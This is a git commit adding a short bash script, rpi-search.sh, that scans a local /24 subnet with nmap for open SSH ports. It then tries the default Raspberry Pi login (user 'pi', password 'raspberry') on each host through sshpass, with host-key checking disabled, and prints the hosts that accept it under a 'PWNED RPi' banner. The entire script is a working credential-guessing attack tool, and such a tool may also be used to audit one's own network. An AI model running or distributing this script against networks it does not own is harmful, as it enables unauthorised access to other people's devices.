216bbe9745779b0fa588153c0ee111b253a91a27
Thomas Clauzel <t.clauzel@gmail.com>
2019-06-23 19:36:15 +0200

    Create rpi-search.sh

---
+++ rpi-search.sh
@@ -0,0 +1,47 @@
+
+#!/bin/bash
+echo "
+
+██████╗ ██████╗ ██╗███████╗███████╗ █████╗ ██████╗  ██████╗██╗  ██╗
+██╔══██╗██╔══██╗██║██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║
+██████╔╝██████╔╝██║███████╗█████╗  ███████║██████╔╝██║     ███████║
+██╔══██╗██╔═══╝ ██║╚════██║██╔══╝  ██╔══██║██╔══██╗██║     ██╔══██║
+██║  ██║██║     ██║███████║███████╗██║  ██║██║  ██║╚██████╗██║  ██║
+╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
+
+"
+range="192.168.1.0/24"
+echo -e "\e[31m --------------------------------- \e[0m"
+echo -e "\e[31m SCANNING FOR RPi on $range  \e[0m"
+echo -e "\e[31m --------------------------------- \e[0m \n"
+nmap -p 22 $range >> liste_rpi.txt
+grep -B 4 open liste_rpi.txt >> liste_open.txt
+grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" liste_open.txt >> ip_ssh_open.txt
+echo " List of exposed ssh server : "
+echo ""
+cat ip_ssh_open.txt
+echo -e "\e[31m --------------------------------- \e[0m"
+echo -e "\e[31m TRYING DEFAUT LOGIN FOR RPi  \e[0m"
+echo -e "\e[31m --------------------------------- \e[0m \n"
+cat ip_ssh_open.txt |  while read output
+do
+    echo "check for $output"
+    out=$(sshpass -p 'raspberry' ssh -T -o StrictHostKeyChecking=no  pi@$output /root 2>&1)
+    echo $out > tmp.txt
+    string1="Permission denied, please try again."
+    if grep -qF "$string1" tmp.txt;then
+        echo "$output is not vulnerable"
+    else
+        echo "$output is vulnerable !!!"
+        echo $output >> vulerables_rpi.txt
+    fi
+echo "quitte boucle"
+done
+rm tmp.txt > /dev/null 2>&1
+rm liste_rpi.txt > /dev/null 2>&1
+rm liste_open.txt > /dev/null 2>&1
+rm ip_ssh_open.txt > /dev/null 2>&1
+echo -e "\e[31m --------------------------------- \e[0m"
+echo -e "\e[31m PWNED RPi : \e[0m"
+echo -e "\e[31m --------------------------------- \e[0m \n"
+cat vulerables_rpi.txt
